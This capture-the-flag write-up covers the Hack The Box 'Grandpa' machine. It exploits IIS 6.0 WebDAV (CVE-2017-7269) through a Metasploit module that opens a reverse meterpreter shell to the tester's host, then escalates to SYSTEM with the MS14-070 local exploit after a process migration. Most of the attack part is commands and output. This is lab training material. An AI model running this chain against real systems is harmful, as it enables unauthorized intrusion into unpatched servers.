# Grandpa - Hack The Box
Easy Windows box, and an old one. The way in is an ancient IIS 6.0 server with WebDAV turned on, which has a public buffer overflow and a ready Metasploit module. Root is a kernel exploit the box is years behind on. Sounds like a clean two-step job, and it is, but the privilege escalation fought me for a while because of the process my shell landed in, so I'm writing down what actually happened, mistakes included.
Box: Grandpa | OS: Windows | Difficulty: Easy | Status: Retired
Authorized lab practice only.
## Recon
Started with nmap, like always:

```
nmap -sCV -A -T4 <target-ip>
```


```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan:
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_  WebDAV type: Unknown
|_http-title: Under Construction
```

One open port, and it's Microsoft IIS 6.0. That version alone is a giveaway, it ships with Windows Server 2003, which is long dead and unpatched. The scan also shows WebDAV is on and happily lists methods like PUT and MOVE. The page itself is just an "Under Construction" placeholder, so there's nothing to dig into on the web side. The target is the IIS and WebDAV stack, not the website.
IIS 6.0 with WebDAV points straight at one thing, the ScStoragePathFromUrl buffer overflow, CVE-2017-7269.
## Getting a shell
This one has a Metasploit module, so I went looking for it:

```
msfconsole -q
search iis webdav
```

The one I wanted:

```
exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

Set the target and my own details and fired it:

```
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS <target-ip>
set LHOST <your-ip>
set LPORT 4442
exploit
```

A meterpreter session came back almost instantly:

```
(Meterpreter 1)(c:\windows\system32\inetsrv) >
```

Tiny fumble right away, when I went to background the session I typed `y` at the prompt and got "Unknown command: y". Nothing broke, just use `background` or Ctrl+Z properly instead of answering the prompt like that.
The shell is running as `NT AUTHORITY\NETWORK SERVICE`, a low privilege account. Foothold done, now I need to climb to SYSTEM.
## Getting root
First move was to let Metasploit suggest local exploits for the session:

```
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

It came back with a handful of candidates, including ms14_058, ms15_051 and ms14_070. I went with MS14-070:

```
use exploit/windows/local/ms14_070_tcpip_ioctl
set SESSION 1
exploit
```

And it failed. Twice:

```
[-] Exploit failed: stdapi_sys_config_getsid: Operation failed: Access is denied.
```

This is where I lost a good chunk of time. Even a plain `getuid` on the session threw the same "Access is denied". My first thought was that the box just wasn't vulnerable, but the suggester had clearly flagged it, so something else was off.
The problem wasn't the exploit, it was where my shell was living. The overflow had dropped me into a short lived `rundll32` process with a restricted NETWORK SERVICE token, and that token can't even look up its own user. The exploit asks "who am I" before it runs, that call gets denied, and the whole thing quits before it does anything.
The fix is to move to a better process. Listed what was running:

```
ps
```

and spotted a stable NETWORK SERVICE process to jump into:

```
2680  davcdata.exe   NT AUTHORITY\NETWORK SERVICE
```

Migrated into it:

```
migrate 2680
getuid
```

This time `getuid` answered properly with `NT AUTHORITY\NETWORK SERVICE`, which told me the token was healthy again. Two things mattered here, migrate to a process at your own privilege level (don't aim for a SYSTEM process before you are SYSTEM), and pick a stable one, not the dying `rundll32` I started in.
With the session migrated, I ran the exact same exploit again:

```
background
use exploit/windows/local/ms14_070_tcpip_ioctl
set SESSION 1
exploit
```

Same module, but now:

```
[+] Exploitation successful!
(Meterpreter 2)(C:\) > getuid
Server username: NT AUTHORITY\SYSTEM
```

SYSTEM. The only thing that changed between failure and success was the process I was sitting in.
From the SYSTEM shell both flags were easy. The user flag sits in Harry's desktop, root in the Administrator's:

```
cat "C:\Documents and Settings\Harry\Desktop\user.txt"
cat "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

## Takeaways

* The version number did half the work. IIS 6.0 means Server 2003, and 2003 means a pile of public exploits waiting.
* "Access is denied" on a privesc isn't always the box saying no. Check what process your shell is in first, a restricted or dying process will block the exploit before it even starts.
* Migrate early on these IIS overflow shells, and migrate to a process at your own privilege level.
* Most of my time went to the process issue, not the exploit. Same lesson as last time, fix your environment before you blame the tool.
